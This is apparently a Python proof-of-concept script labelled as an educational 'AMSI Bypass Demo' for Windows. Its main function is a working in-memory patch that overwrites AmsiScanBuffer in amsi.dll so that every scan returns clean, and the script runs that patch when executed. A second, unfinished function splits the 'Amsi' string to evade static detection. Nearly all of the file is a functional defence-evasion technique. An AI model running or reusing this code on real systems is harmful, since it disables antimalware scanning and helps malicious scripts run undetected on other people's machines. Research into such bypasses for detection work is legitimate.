#!/usr/bin/env python3
"""
AMSI Bypass Demo
Demonstrates how malware disables Windows AMSI scanning
Educational/Research purposes only
"""
import ctypes
import sys

def amsi_bypass_patch():
    """
    Patches AMSI.dll AmsiScanBuffer to return AMSI_RESULT_CLEAN
    This prevents PowerShell and other Windows components from
    scanning content for malicious signatures
    """
    # Get handle to AMSI.dll
    amsi = ctypes.windll.LoadLibrary("amsi.dll")
    
    # Get AmsiScanBuffer address
    hModule = ctypes.windll.kernel32.GetModuleHandleW("amsi.dll")
    if not hModule:
        return False
        
    AmsiScanBuffer = ctypes.windll.kernel32.GetProcAddress(hModule, b"AmsiScanBuffer")
    if not AmsiScanBuffer:
        return False
    
    # Patch bytes (x64): mov eax, 0x00 (AMSI_RESULT_CLEAN) ; ret
    # This makes AmsiScanBuffer always return "clean"
    patch = bytes([
        0xB8, 0x00, 0x00, 0x00, 0x00,  # mov eax, 0x00
        0xC3                           # ret
    ])
    
    # Make memory writable
    oldProtect = ctypes.c_ulong(0)
    ctypes.windll.kernel32.VirtualProtect(
        AmsiScanBuffer, len(patch), 0x40, ctypes.byref(oldProtect)  # PAGE_EXECUTE_READWRITE
    )
    
    # Write patch
    ctypes.memmove(AmsiScanBuffer, patch, len(patch))
    
    # Restore protection
    ctypes.windll.kernel32.VirtualProtect(
        AmsiScanBuffer, len(patch), oldProtect.value, ctypes.byref(oldProtect)
    )
    
    return True

# Memory-based bypass using string manipulation (safer detection-wise)
def amsi_string_bypass():
    """
    Splits "Amsi" string to avoid static string detection
    while still disabling AMSI by patching context
    """
    a, m, s, i = "A", "m", "s", "i"
    amsi_init = ctypes.windll.LoadLibrary(f"{a.lower()}{m}{s}{i}.dll")
    
    # Alternative: corrupt AMSI context by corrupting session handle
    # In PowerShell: [System.Runtime.InteropServices.Marshal]::Copy
    pass

if __name__ == "__main__":
    if amsi_bypass_patch():
        print("[+] AMSI bypassed - scanning disabled")
    else:
        print("[-] Failed to bypass AMSI")